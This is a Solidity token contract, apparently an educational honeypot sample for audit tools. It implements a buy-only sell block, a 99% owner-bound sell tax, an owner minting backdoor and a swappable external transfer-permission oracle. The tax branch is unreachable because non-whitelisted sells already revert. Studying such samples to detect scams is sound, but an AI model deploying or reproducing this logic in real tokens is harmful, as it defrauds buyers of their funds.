// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Critical DEX Trap Honeypot Token (Archetype: Asymmetric Liquidity Siphon)
 * @author CSDF Educational Security Research Team
 * @dev Educational reference token demonstrating CRITICAL severity honeypot vectors:
 *      1. Asymmetric DEX Sell Block: Users can buy from Uniswap, but selling back to pair reverts.
 *      2. Confiscatory 99% Sell Tax: Any transfers routed through DEX take 99% fee.
 *      3. Hidden Supply Inflation: Privileged unconstrained minting backdoor.
 *      4. External Permission Oracle Trap: Delegates transfer authorization to external contract.
 *
 * EXPECTED AUDIT THREAT LEVEL: CRITICAL (Score: 100/100)
 */

interface ITokenFilter {
    function canTransfer(address sender, address recipient) external view returns (bool);
}

contract CriticalDexTrapToken {
    string public name = "Critical DEX Trap Token";
    string public symbol = "DEXTRAP";
    uint8 public decimals = 18;
    uint256 public totalSupply = 5000000 * 10**18;

    address public owner;
    address public uniswapV2Pair;
    address public securityOracle;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isWhitelisted;

    // Confiscatory 99% sell fee
    uint256 public sellTax = 99;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }

    constructor(address _pair, address _oracle) {
        owner = msg.sender;
        uniswapV2Pair = _pair;
        securityOracle = _oracle;
        balanceOf[msg.sender] = totalSupply;
        isWhitelisted[msg.sender] = true;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setPair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function setSecurityOracle(address _oracle) external onlyOwner {
        securityOracle = _oracle;
    }

    function setWhitelist(address account, bool status) external onlyOwner {
        isWhitelisted[account] = status;
    }

    // PRIVILEGED BACKDOOR: Hidden unconstrained minting dilutes pool
    function mint(address account, uint256 amount) external onlyOwner {
        totalSupply += amount;
        balanceOf[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        uint256 currentAllowance = allowance[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            allowance[sender][msg.sender] = currentAllowance - amount;
        }
        _transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from zero address");
        require(to != address(0), "ERC20: transfer to zero address");
        require(balanceOf[from] >= amount, "ERC20: transfer amount exceeds balance");

        // TRAP 1: External permission oracle call
        if (securityOracle != address(0)) {
            require(ITokenFilter(securityOracle).canTransfer(from, to), "SecurityOracle: transfer rejected");
        }

        // TRAP 2: Asymmetric DEX sell block (ordinary buyers cannot sell back to pair)
        if (to == uniswapV2Pair) {
            require(isWhitelisted[from], "Sells are restricted to whitelisted liquidity managers");
        }

        // TRAP 3: Confiscatory sell fee calculation (99% tax)
        uint256 fee = 0;
        if (to == uniswapV2Pair && !isWhitelisted[from]) {
            fee = (amount * sellTax) / 100;
        }

        uint256 transferAmount = amount - fee;
        balanceOf[from] -= amount;
        balanceOf[to] += transferAmount;

        if (fee > 0) {
            balanceOf[owner] += fee;
            emit Transfer(from, owner, fee);
        }

        emit Transfer(from, to, transferAmount);
    }
}
